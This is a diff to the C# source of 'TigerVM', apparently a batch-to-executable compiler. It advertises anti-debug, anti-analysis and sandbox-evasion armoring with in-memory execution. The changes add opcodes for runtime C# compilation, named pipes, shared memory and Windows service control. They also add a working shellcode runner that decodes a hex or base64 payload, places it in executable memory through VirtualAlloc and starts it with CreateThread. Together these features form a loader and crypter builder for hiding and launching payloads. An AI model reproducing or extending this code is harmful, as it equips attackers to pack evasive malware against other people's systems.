@@ -14,8 +14,8 @@ using System.IO.Compression;
 [assembly: AssemblyCompany("tigergenz")]
 [assembly: AssemblyProduct("TigerVM Enterprise Binary Suite")]
 [assembly: AssemblyCopyright("Copyright (C) tigergenz")]
-[assembly: AssemblyVersion("9.0.0.0")]
-[assembly: AssemblyFileVersion("9.0.0.0")]
+[assembly: AssemblyVersion("10.0.0.0")]
+[assembly: AssemblyFileVersion("10.0.0.0")]
 
 namespace TigerGenZ.BatCompiler
 {
@@ -43,7 +43,7 @@ namespace TigerGenZ.BatCompiler
  ╔══════════════════════════════════════════════════════════════╗
  ║  T I G E R V M   ::   B A T C H   C O M P I L E R   P R O    ║
  ║  Zero-Disk Virtual Machine & Enterprise Binary Hardening     ║
- ║  Build v9.0.0-TITAN | Arch: RAM Pointers + Win32 Reg + Net   ║
+ ║  Build v10.0.0-SINGULARITY | Arch: Roslyn C# + IPC + Advapi  ║
  ╚══════════════════════════════════════════════════════════════╝");
             Console.ResetColor();
         }
@@ -143,7 +143,7 @@ namespace TigerGenZ.BatCompiler
 
                 string outExe = Path.Combine(baseDir, baseName + ".exe");
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("\n[+] Compiling Batch with TigerVM v9.0-TITAN Engine...");
+                Console.WriteLine("\n[+] Compiling Batch with TigerVM v10.0-SINGULARITY Engine...");
                 if (enableCff) Console.WriteLine("[+] Applying Control Flow Flattening (CFF State Machine)...");
                 if (enableArmor) Console.WriteLine("[+] Injecting Anti-Analysis, Anti-Debug, and SHA-256 Anti-Tamper...");
                 if (enableAntiVm) Console.WriteLine("[+] Injecting Anti-VM & Automated Sandbox Evasion...");
@@ -153,7 +153,7 @@ namespace TigerGenZ.BatCompiler
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("\n[OK] Build complete: " + outExe);
-                    Console.WriteLine("[*] Runtime Pipeline: TigerVM v9.0-TITAN Virtual Stack (100% In-Memory Execution)");
+                    Console.WriteLine("[*] Runtime Pipeline: TigerVM v10.0-SINGULARITY Virtual Stack (100% In-Memory Execution)");
                 }
                 else
                 {
@@ -319,7 +319,7 @@ namespace TigerGenZ.BatCompiler
             {
                 Console.WriteLine("[*] Source Target   : " + Path.GetFullPath(inputPath));
                 Console.WriteLine("[*] Output Binary   : " + Path.GetFullPath(outputPath));
-                Console.WriteLine("[*] Execution Model : TigerVM v9.0-TITAN (Zero-Disk In-Memory Virtual Stack)");
+                Console.WriteLine("[*] Execution Model : TigerVM v10.0-SINGULARITY (Zero-Disk In-Memory Virtual Stack)");
                 Console.WriteLine("[*] Control Flow    : " + (cff ? "Control Flow Flattening (CFF ACTIVE)" : "Direct Linear Execution"));
                 Console.WriteLine("[*] Armor Engine    : " + (armor ? "Anti-Analysis, Anti-Debug, SHA-256 Anti-Tamper ACTIVE" : "Standard"));
                 Console.WriteLine("[*] Sandbox Evasion : " + (antiVm ? "Active Hypervisor & Minimal Spec Evasion" : "Standard"));
@@ -958,7 +958,15 @@ Examples:
             MemReadStr = 60,
             SysInfo = 61,
             NetPing = 62,
-            VfsUnzip = 63
+            VfsUnzip = 63,
+            EvalCs = 64,
+            PipeServer = 65,
+            PipeClient = 66,
+            ShmWrite = 67,
+            ShmRead = 68,
+            SvcQuery = 69,
+            SvcControl = 70,
+            ShellExec = 71
         }
 
         public class VmInstruction
@@ -1465,6 +1473,134 @@ Examples:
                         string zipSrc = parts.Length > 1 ? parts[1] : "";
                         string vfsPrefix = parts.Length > 2 ? parts[2] : "VFS:\\";
                         instrs.Add(new VmInstruction { Op = VmOpcode.VfsUnzip, Arg1 = zipSrc, Arg2 = vfsPrefix });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("eval_cs ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("evalcs ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string rest = dirLine.Substring(dirLine.IndexOf(' ') + 1).Trim();
+                        string destVar = "EVAL_RESULT";
+                        string code = "";
+                        if (rest.Contains("\""))
+                        {
+                            int q1 = rest.IndexOf('"');
+                            int q2 = rest.LastIndexOf('"');
+                            destVar = rest.Substring(0, q1).Trim();
+                            code = rest.Substring(q1 + 1, q2 - q1 - 1);
+                        }
+                        else
+                        {
+                            string[] parts = rest.Split(new[] { ' ' }, 2);
+                            destVar = parts.Length > 0 ? parts[0] : "EVAL_RESULT";
+                            code = parts.Length > 1 ? parts[1] : "";
+                        }
+                        instrs.Add(new VmInstruction { Op = VmOpcode.EvalCs, Arg1 = destVar, Arg2 = code });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("pipe_server ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("pipeserver ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
+                        string destVar = parts.Length > 1 ? parts[1] : "PIPE_DATA";
+                        string pipeName = parts.Length > 2 ? parts[2].Trim('"', '\'') : "TigerPipe";
+                        string timeout = parts.Length > 3 ? parts[3] : "5000";
+                        instrs.Add(new VmInstruction { Op = VmOpcode.PipeServer, Arg1 = destVar, Arg2 = pipeName, Arg3 = timeout });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("pipe_client ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("pipeclient ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("pipe_send ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
+                        string pipeName = parts.Length > 1 ? parts[1].Trim('"', '\'') : "TigerPipe";
+                        string msg = parts.Length > 2 ? parts[2] : "";
+                        string timeout = parts.Length > 3 ? parts[3] : "3000";
+                        instrs.Add(new VmInstruction { Op = VmOpcode.PipeClient, Arg1 = pipeName, Arg2 = msg, Arg3 = timeout });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("shm_write ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("shmwrite ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string rest = dirLine.Substring(dirLine.IndexOf(' ') + 1).Trim();
+                        string mapName = "TigerShm";
+                        string data = "";
+                        if (rest.Contains("\""))
+                        {
+                            int q1 = rest.IndexOf('"');
+                            int q2 = rest.IndexOf('"', q1 + 1);
+                            if (q2 != -1)
+                            {
+                                mapName = rest.Substring(q1 + 1, q2 - q1 - 1);
+                                data = rest.Substring(q2 + 1).Trim().Trim('"', '\'');
+                            }
+                            else
+                            {
+                                string[] parts = rest.Split(new[] { ' ' }, 2);
+                                mapName = parts[0].Trim('"', '\'');
+                                data = parts.Length > 1 ? parts[1].Trim('"', '\'') : "";
+                            }
+                        }
+                        else
+                        {
+                            string[] parts = rest.Split(new[] { ' ' }, 2);
+                            mapName = parts.Length > 0 ? parts[0] : "TigerShm";
+                            data = parts.Length > 1 ? parts[1] : "";
+                        }
+                        instrs.Add(new VmInstruction { Op = VmOpcode.ShmWrite, Arg1 = mapName, Arg2 = data });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("shm_read ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("shmread ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
+                        string destVar = parts.Length > 1 ? parts[1] : "SHM_DATA";
+                        string mapName = parts.Length > 2 ? parts[2].Trim('"', '\'') : "TigerShm";
+                        string maxBytes = parts.Length > 3 ? parts[3] : "4096";
+                        instrs.Add(new VmInstruction { Op = VmOpcode.ShmRead, Arg1 = destVar, Arg2 = mapName, Arg3 = maxBytes });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("svc_query ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("svcquery ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = dirLine.Split(new[] { ' ' }, 3);
+                        string destVar = parts.Length > 1 ? parts[1] : "SVC_STATUS";
+                        string svcName = parts.Length > 2 ? parts[2].Trim('"', '\'') : "";
+                        instrs.Add(new VmInstruction { Op = VmOpcode.SvcQuery, Arg1 = destVar, Arg2 = svcName });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("svc_control ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("svccontrol ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] parts = dirLine.Split(new[] { ' ' }, 4);
+                        string destVar = parts.Length > 1 ? parts[1] : "SVC_RESULT";
+                        string svcName = parts.Length > 2 ? parts[2].Trim('"', '\'') : "";
+                        string action = parts.Length > 3 ? parts[3].Trim('"', '\'') : "QUERY";
+                        instrs.Add(new VmInstruction { Op = VmOpcode.SvcControl, Arg1 = destVar, Arg2 = svcName, Arg3 = action });
+                        continue;
+                    }
+
+                    if (dirLine.StartsWith("shell_exec ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("shellexec ", StringComparison.OrdinalIgnoreCase) || dirLine.StartsWith("shellcode ", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string rest = dirLine.Substring(dirLine.IndexOf(' ') + 1).Trim();
+                        string destVar = "SHELL_RESULT";
+                        string code = "";
+                        string timeout = "5000";
+                        if (rest.Contains("\""))
+                        {
+                            int q1 = rest.IndexOf('"');
+                            int q2 = rest.LastIndexOf('"');
+                            destVar = rest.Substring(0, q1).Trim();
+                            code = rest.Substring(q1 + 1, q2 - q1 - 1);
+                            string after = rest.Substring(q2 + 1).Trim();
+                            if (!string.IsNullOrEmpty(after)) timeout = after;
+                        }
+                        else
+                        {
+                            string[] parts = rest.Split(new[] { ' ' }, 3);
+                            destVar = parts.Length > 0 ? parts[0] : "SHELL_RESULT";
+                            code = parts.Length > 1 ? parts[1] : "";
+                            timeout = parts.Length > 2 ? parts[2] : "5000";
+                        }
+                        instrs.Add(new VmInstruction { Op = VmOpcode.ShellExec, Arg1 = destVar, Arg2 = code, Arg3 = timeout });
                         continue;
                     }
                 }
@@ -2261,7 +2397,7 @@ Examples:
             string armorCall = enableArmor ? "            TigerArmor.VerifyEnvironment();" : "";
 
             StringBuilder csBld = new StringBuilder();
-            csBld.AppendLine("// [ TigerVM Native Binary Host v5.0 // Hardened Enterprise Runtime ]");
+            csBld.AppendLine("// [ TigerVM Native Binary Host v10.0-SINGULARITY // Hardened Enterprise Runtime ]");
             csBld.AppendLine("using System;");
             csBld.AppendLine("using System.IO;");
             csBld.AppendLine("using System.IO.Compression;");
@@ -2272,10 +2408,14 @@ Examples:
             csBld.AppendLine("using System.Runtime.InteropServices;");
             csBld.AppendLine("using System.Text.RegularExpressions;");
             csBld.AppendLine("using System.Security.Cryptography;");
+            csBld.AppendLine("using System.IO.Pipes;");
+            csBld.AppendLine("using System.IO.MemoryMappedFiles;");
+            csBld.AppendLine("using Microsoft.CSharp;");
+            csBld.AppendLine("using System.CodeDom.Compiler;");
             csBld.AppendLine("[assembly: AssemblyTitle(\"TigerVM Standalone Binary\")]");
             csBld.AppendLine("[assembly: AssemblyProduct(\"TigerVM Virtualized Application\")]");
-            csBld.AppendLine("[assembly: AssemblyVersion(\"9.0.0.0\")]");
-            csBld.AppendLine("[assembly: AssemblyFileVersion(\"9.0.0.0\")]");
+            csBld.AppendLine("[assembly: AssemblyVersion(\"10.0.0.0\")]");
+            csBld.AppendLine("[assembly: AssemblyFileVersion(\"10.0.0.0\")]");
             csBld.AppendLine("namespace TigerVmApp {");
 
             csBld.AppendLine(armorCode);
@@ -3035,6 +3175,194 @@ Examples:
             csBld.AppendLine("        }");
             csBld.AppendLine("    }");
             csBld.AppendLine("");
+            csBld.AppendLine("    public static class TigerSingularity {");
+            csBld.AppendLine("        public static string EvalCSharp(string code) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                code = (code ?? \"\").Trim();");
+            csBld.AppendLine("                if (code.StartsWith(\"\\\"\") && code.EndsWith(\"\\\"\") && code.Length >= 2) code = code.Substring(1, code.Length - 2);");
+            csBld.AppendLine("                code = code.Replace(\"\\\\\\\"\", \"\\\"\").Replace(\"\\\\\\\\\", \"\\\\\");");
+            csBld.AppendLine("                using (var prov = new Microsoft.CSharp.CSharpCodeProvider()) {");
+            csBld.AppendLine("                    var cp = new System.CodeDom.Compiler.CompilerParameters();");
+            csBld.AppendLine("                    cp.GenerateInMemory = true;");
+            csBld.AppendLine("                    cp.GenerateExecutable = false;");
+            csBld.AppendLine("                    cp.ReferencedAssemblies.Add(\"System.dll\");");
+            csBld.AppendLine("                    cp.ReferencedAssemblies.Add(\"System.Core.dll\");");
+            csBld.AppendLine("                    cp.ReferencedAssemblies.Add(\"System.Data.dll\");");
+            csBld.AppendLine("                    cp.ReferencedAssemblies.Add(\"mscorlib.dll\");");
+            csBld.AppendLine("                    string fullSource = code.Contains(\"class \") ? code :");
+            csBld.AppendLine("                        \"using System; using System.IO; using System.Text; using System.Diagnostics; namespace TigerVmDyn { public class Evaluator { public static object Run() { \" + code + \"; return null; } } }\";");
+            csBld.AppendLine("                    var cr = prov.CompileAssemblyFromSource(cp, fullSource);");
+            csBld.AppendLine("                    if (cr.Errors.HasErrors) return \"ERR_COMPILE: \" + cr.Errors[0].ErrorText;");
+            csBld.AppendLine("                    var t = cr.CompiledAssembly.GetType(\"TigerVmDyn.Evaluator\");");
+            csBld.AppendLine("                    if (t != null) {");
+            csBld.AppendLine("                        var m = t.GetMethod(\"Run\");");
+            csBld.AppendLine("                        object res = m.Invoke(null, null);");
+            csBld.AppendLine("                        return res != null ? res.ToString() : \"OK\";");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                    foreach (var expType in cr.CompiledAssembly.GetTypes()) {");
+            csBld.AppendLine("                        var m = expType.GetMethod(\"Run\") ?? expType.GetMethod(\"Execute\") ?? expType.GetMethod(\"Main\");");
+            csBld.AppendLine("                        if (m != null) {");
+            csBld.AppendLine("                            object res = m.Invoke(null, m.GetParameters().Length == 0 ? null : new object[] { new string[0] });");
+            csBld.AppendLine("                            return res != null ? res.ToString() : \"OK\";");
+            csBld.AppendLine("                        }");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                    return \"OK\";");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR_EXEC: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        public static string PipeServerRead(string pipeName, int timeoutMs) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                using (var server = new System.IO.Pipes.NamedPipeServerStream(pipeName, System.IO.Pipes.PipeDirection.InOut, 1, System.IO.Pipes.PipeTransmissionMode.Byte, System.IO.Pipes.PipeOptions.Asynchronous)) {");
+            csBld.AppendLine("                    var ar = server.BeginWaitForConnection(null, null);");
+            csBld.AppendLine("                    if (ar.AsyncWaitHandle.WaitOne(timeoutMs <= 0 ? 5000 : timeoutMs)) {");
+            csBld.AppendLine("                        server.EndWaitForConnection(ar);");
+            csBld.AppendLine("                        using (var reader = new System.IO.StreamReader(server, Encoding.UTF8)) {");
+            csBld.AppendLine("                            return reader.ReadLine() ?? \"\";");
+            csBld.AppendLine("                        }");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                    return \"TIMEOUT\";");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        public static string PipeClientSend(string pipeName, string message, int timeoutMs) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                using (var client = new System.IO.Pipes.NamedPipeClientStream(\".\", pipeName, System.IO.Pipes.PipeDirection.InOut)) {");
+            csBld.AppendLine("                    client.Connect(timeoutMs <= 0 ? 3000 : timeoutMs);");
+            csBld.AppendLine("                    using (var writer = new System.IO.StreamWriter(client, Encoding.UTF8) { AutoFlush = true }) {");
+            csBld.AppendLine("                        writer.WriteLine(message);");
+            csBld.AppendLine("                        return \"SUCCESS\";");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        private static readonly Dictionary<string, System.IO.MemoryMappedFiles.MemoryMappedFile> _shmMap = new Dictionary<string, System.IO.MemoryMappedFiles.MemoryMappedFile>(StringComparer.OrdinalIgnoreCase);");
+            csBld.AppendLine("        public static string ShmWrite(string mapName, string data) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                byte[] bytes = Encoding.UTF8.GetBytes(data);");
+            csBld.AppendLine("                int size = Math.Max(4096, bytes.Length + 4);");
+            csBld.AppendLine("                System.IO.MemoryMappedFiles.MemoryMappedFile mmf;");
+            csBld.AppendLine("                lock (_shmMap) {");
+            csBld.AppendLine("                    if (!_shmMap.TryGetValue(mapName, out mmf)) {");
+            csBld.AppendLine("                        mmf = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateOrOpen(mapName, size);");
+            csBld.AppendLine("                        _shmMap[mapName] = mmf;");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("                using (var stream = mmf.CreateViewStream(0, size)) {");
+            csBld.AppendLine("                    stream.Write(BitConverter.GetBytes(bytes.Length), 0, 4);");
+            csBld.AppendLine("                    stream.Write(bytes, 0, bytes.Length);");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("                return \"SUCCESS\";");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        public static string ShmRead(string mapName, int maxBytes) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                using (var mmf = System.IO.MemoryMappedFiles.MemoryMappedFile.OpenExisting(mapName)) {");
+            csBld.AppendLine("                    int readSize = maxBytes <= 0 ? 4096 : maxBytes + 4;");
+            csBld.AppendLine("                    using (var stream = mmf.CreateViewStream(0, readSize)) {");
+            csBld.AppendLine("                        byte[] lenBuf = new byte[4];");
+            csBld.AppendLine("                        int r = stream.Read(lenBuf, 0, 4);");
+            csBld.AppendLine("                        if (r < 4) return \"\";");
+            csBld.AppendLine("                        int len = BitConverter.ToInt32(lenBuf, 0);");
+            csBld.AppendLine("                        if (len <= 0 || len > 10 * 1024 * 1024) return \"\";");
+            csBld.AppendLine("                        byte[] dataBuf = new byte[len];");
+            csBld.AppendLine("                        stream.Read(dataBuf, 0, len);");
+            csBld.AppendLine("                        return Encoding.UTF8.GetString(dataBuf);");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true, CharSet = CharSet.Auto)]");
+            csBld.AppendLine("        private static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true, CharSet = CharSet.Auto)]");
+            csBld.AppendLine("        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);");
+            csBld.AppendLine("        [StructLayout(LayoutKind.Sequential)]");
+            csBld.AppendLine("        private struct SERVICE_STATUS {");
+            csBld.AppendLine("            public int dwServiceType; public int dwCurrentState; public int dwControlsAccepted; public int dwWin32ExitCode; public int dwServiceSpecificExitCode; public int dwCheckPoint; public int dwWaitHint;");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool QueryServiceStatus(IntPtr hService, ref SERVICE_STATUS lpServiceStatus);");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool CloseServiceHandle(IntPtr hSCObject);");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool StartService(IntPtr hService, int dwNumServiceArgs, IntPtr lpServiceArgVectors);");
+            csBld.AppendLine("        [DllImport(\"advapi32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool ControlService(IntPtr hService, int dwControl, ref SERVICE_STATUS lpServiceStatus);");
+            csBld.AppendLine("        public static string ServiceQuery(string serviceName) {");
+            csBld.AppendLine("            IntPtr scm = OpenSCManager(null, null, 1);");
+            csBld.AppendLine("            if (scm == IntPtr.Zero) return \"ACCESS_DENIED\";");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                IntPtr svc = OpenService(scm, serviceName, 4);");
+            csBld.AppendLine("                if (svc == IntPtr.Zero) return \"NOT_FOUND\";");
+            csBld.AppendLine("                try {");
+            csBld.AppendLine("                    SERVICE_STATUS st = new SERVICE_STATUS();");
+            csBld.AppendLine("                    if (QueryServiceStatus(svc, ref st)) {");
+            csBld.AppendLine("                        switch (st.dwCurrentState) {");
+            csBld.AppendLine("                            case 1: return \"STOPPED\"; case 2: return \"START_PENDING\"; case 3: return \"STOP_PENDING\"; case 4: return \"RUNNING\"; case 5: return \"CONTINUE_PENDING\"; case 6: return \"PAUSE_PENDING\"; case 7: return \"PAUSED\"; default: return \"STATE_\" + st.dwCurrentState;");
+            csBld.AppendLine("                        }");
+            csBld.AppendLine("                    }");
+            csBld.AppendLine("                    return \"UNKNOWN\";");
+            csBld.AppendLine("                } finally { CloseServiceHandle(svc); }");
+            csBld.AppendLine("            } finally { CloseServiceHandle(scm); }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        public static string ServiceControl(string serviceName, string action) {");
+            csBld.AppendLine("            action = (action ?? \"\").Trim().ToUpperInvariant();");
+            csBld.AppendLine("            uint access = (action == \"START\") ? 0x0010u : 0x0020u;");
+            csBld.AppendLine("            IntPtr scm = OpenSCManager(null, null, 0x000F003F);");
+            csBld.AppendLine("            if (scm == IntPtr.Zero) scm = OpenSCManager(null, null, 1);");
+            csBld.AppendLine("            if (scm == IntPtr.Zero) return \"ACCESS_DENIED\";");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                IntPtr svc = OpenService(scm, serviceName, access);");
+            csBld.AppendLine("                if (svc == IntPtr.Zero) return \"NOT_FOUND\";");
+            csBld.AppendLine("                try {");
+            csBld.AppendLine("                    if (action == \"START\") { bool ok = StartService(svc, 0, IntPtr.Zero); return ok ? \"SUCCESS\" : \"START_FAILED\"; }");
+            csBld.AppendLine("                    else if (action == \"STOP\") { SERVICE_STATUS st = new SERVICE_STATUS(); bool ok = ControlService(svc, 1, ref st); return ok ? \"SUCCESS\" : \"STOP_FAILED\"; }");
+            csBld.AppendLine("                    return \"INVALID_ACTION\";");
+            csBld.AppendLine("                } finally { CloseServiceHandle(svc); }");
+            csBld.AppendLine("            } finally { CloseServiceHandle(scm); }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);");
+            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);");
+            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);");
+            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);");
+            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
+            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
+            csBld.AppendLine("        private static extern bool CloseHandle(IntPtr hObject);");
+            csBld.AppendLine("        public static string ExecuteShellcode(string payload, int timeoutMs) {");
+            csBld.AppendLine("            try {");
+            csBld.AppendLine("                byte[] rawBytes;");
+            csBld.AppendLine("                payload = (payload ?? \"\").Trim();");
+            csBld.AppendLine("                string hex = payload.Replace(\" \", \"\").Replace(\"0x\", \"\").Replace(\",\", \"\").Trim();");
+            csBld.AppendLine("                bool isHex = hex.Length > 0 && hex.Length % 2 == 0;");
+            csBld.AppendLine("                if (isHex) {");
+            csBld.AppendLine("                    foreach (char c in hex) { if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) { isHex = false; break; } }");
+            csBld.AppendLine("                }");
+            csBld.AppendLine("                if (isHex) {");
+            csBld.AppendLine("                    rawBytes = new byte[hex.Length / 2];");
+            csBld.AppendLine("                    for (int i = 0; i < rawBytes.Length; i++) rawBytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);");
+            csBld.AppendLine("                } else { rawBytes = Convert.FromBase64String(payload); }");
+            csBld.AppendLine("                if (rawBytes.Length == 0) return \"EMPTY_PAYLOAD\";");
+            csBld.AppendLine("                IntPtr pMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawBytes.Length, 0x3000, 0x40);");
+            csBld.AppendLine("                if (pMem == IntPtr.Zero) return \"ALLOC_FAILED\";");
+            csBld.AppendLine("                Marshal.Copy(rawBytes, 0, pMem, rawBytes.Length);");
+            csBld.AppendLine("                uint thId = 0;");
+            csBld.AppendLine("                IntPtr hTh = CreateThread(IntPtr.Zero, UIntPtr.Zero, pMem, IntPtr.Zero, 0, out thId);");
+            csBld.AppendLine("                if (hTh == IntPtr.Zero) return \"THREAD_CREATE_FAILED\";");
+            csBld.AppendLine("                WaitForSingleObject(hTh, timeoutMs <= 0 ? 5000 : (uint)timeoutMs);");
+            csBld.AppendLine("                uint exitCode = 0; GetExitCodeThread(hTh, out exitCode); CloseHandle(hTh);");
+            csBld.AppendLine("                return \"EXIT_\" + exitCode;");
+            csBld.AppendLine("            } catch (Exception ex) { return \"ERR: \" + ex.Message; }");
+            csBld.AppendLine("        }");
+            csBld.AppendLine("    }");
+            csBld.AppendLine("");
             csBld.AppendLine("    public class VmCode {");
             csBld.AppendLine("        public int Op;");
             csBld.AppendLine("        public string A1;");
@@ -3749,6 +4077,50 @@ Examples:
             csBld.AppendLine("                        string vuSrc = ExpandVars(a1); string vuPfx = ExpandVars(a2);");
             csBld.AppendLine("                        lock (_threadLock) { TigerSystem.UnzipToVfs(vuSrc, vuPfx, EmbeddedFiles); }");
             csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 64: // EvalCs");
+            csBld.AppendLine("                        string ecVar = a1; string ecCode = ExpandVars(a2);");
+            csBld.AppendLine("                        string ecRes = TigerSingularity.EvalCSharp(ecCode);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[ecVar] = ecRes; Variables[\"EVAL_RESULT\"] = ecRes; Environment.SetEnvironmentVariable(ecVar, ecRes); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 65: // PipeServer");
+            csBld.AppendLine("                        string psVar = a1; string psPipe = ExpandVars(a2);");
+            csBld.AppendLine("                        int psTimeout = 5000; int.TryParse(ExpandVars(a3), out psTimeout);");
+            csBld.AppendLine("                        string psData = TigerSingularity.PipeServerRead(psPipe, psTimeout);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[psVar] = psData; Variables[\"PIPE_DATA\"] = psData; Environment.SetEnvironmentVariable(psVar, psData); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 66: // PipeClient");
+            csBld.AppendLine("                        string pcPipe = ExpandVars(a1); string pcMsg = ExpandVars(a2);");
+            csBld.AppendLine("                        int pcTimeout = 3000; int.TryParse(ExpandVars(a3), out pcTimeout);");
+            csBld.AppendLine("                        string pcRes = TigerSingularity.PipeClientSend(pcPipe, pcMsg, pcTimeout);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[\"PIPE_RESULT\"] = pcRes; Environment.SetEnvironmentVariable(\"PIPE_RESULT\", pcRes); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 67: // ShmWrite");
+            csBld.AppendLine("                        string swMap = ExpandVars(a1); string swData = ExpandVars(a2);");
+            csBld.AppendLine("                        string swRes = TigerSingularity.ShmWrite(swMap, swData);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[\"SHM_RESULT\"] = swRes; Environment.SetEnvironmentVariable(\"SHM_RESULT\", swRes); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 68: // ShmRead");
+            csBld.AppendLine("                        string srVar = a1; string srMap = ExpandVars(a2);");
+            csBld.AppendLine("                        int srMax = 4096; int.TryParse(ExpandVars(a3), out srMax);");
+            csBld.AppendLine("                        string srData = TigerSingularity.ShmRead(srMap, srMax);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[srVar] = srData; Variables[\"SHM_DATA\"] = srData; Environment.SetEnvironmentVariable(srVar, srData); }");
+            csBld.AppendLine("                        break;");
+            csBld.AppendLine("                    case 69: // SvcQuery");
+            csBld.AppendLine("                        string svqVar = a1; string svqName = ExpandVars(a2);");
+            csBld.AppendLine("                        string svqStatus = TigerSingularity.ServiceQuery(svqName);");
+            csBld.AppendLine("                        lock (_threadLock) { Variables[svqVar] = svqStatus; Variables[\"SVC_STATUS\"] = svqStatus; Environment.SetEnvironmentVariable(svqVar, svqStatus); }");
